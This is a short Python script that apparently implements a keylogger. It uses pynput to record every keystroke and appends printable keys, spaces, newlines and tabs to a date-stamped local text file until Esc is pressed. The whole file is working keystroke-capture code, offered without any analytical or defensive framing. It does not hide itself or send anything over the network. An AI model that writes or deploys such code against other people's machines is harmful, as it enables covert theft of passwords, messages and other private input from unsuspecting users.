from pynput.keyboard import Key, Listener
import time

def write_to_file(key):
	with open('key_logger_' + time.strftime('%d-%m-%Y') +'.txt','a') as fh:
		fh.write(key)

def on_key_press(key):
	key_input = str(key)
	
	if not key_input.startswith('Key') or not key_input.find('\\x'):
		write_to_file(key_input.replace("'",''))
	if key_input == 'Key.space':
		write_to_file(' ')
	if key_input == 'Key.enter':
		write_to_file('\n')
	if key_input == 'Key.tab':
		write_to_file('\t')

def on_key_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
	listener.join()